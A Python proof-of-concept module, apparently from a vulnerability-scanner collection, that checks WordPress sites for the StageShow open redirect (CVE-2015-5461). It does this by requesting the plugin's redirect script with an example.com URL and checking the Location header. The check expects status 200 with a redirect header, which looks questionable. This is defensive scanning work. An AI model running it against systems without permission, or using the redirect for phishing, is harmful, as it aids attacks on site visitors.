import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''StageShow <= 5.0.8 - Open Redirect''',
        "description": '''Open redirect vulnerability in the Redirect function in stageshow_redirect.php in the StageShow plugin before 5.0.9 for WordPress allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the url parameter.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/afc0d5b5-280f-424f-bc3e-d04452e56e16", 
            "https://nvd.nist.gov/vuln/detail/CVE-2015-5461"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["redirect", "cve", "cve2015", "wordpress", "wp-plugin"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Fexample.com'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and re.search(r'(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)example\.com.*$', str(resp.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url